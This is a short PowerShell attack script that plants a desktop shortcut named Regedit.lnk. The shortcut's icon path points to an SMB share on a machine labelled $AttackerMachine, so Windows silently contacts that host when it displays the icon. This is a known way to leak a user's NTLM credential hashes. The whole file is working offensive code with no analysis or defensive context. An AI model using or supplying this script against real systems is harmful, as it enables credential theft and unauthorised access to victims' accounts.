# Author: Oddvar Moe
# https://msitpros.com
# Version: 1.0
$AttackerMachine = "192.168.0.100"
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\Regedit.lnk")
$Shortcut.TargetPath = "C:\windows\regedit.exe"
$Shortcut.Iconlocation = "\\$AttackerMachine\icons\icon.png,0"
$Shortcut.Save()
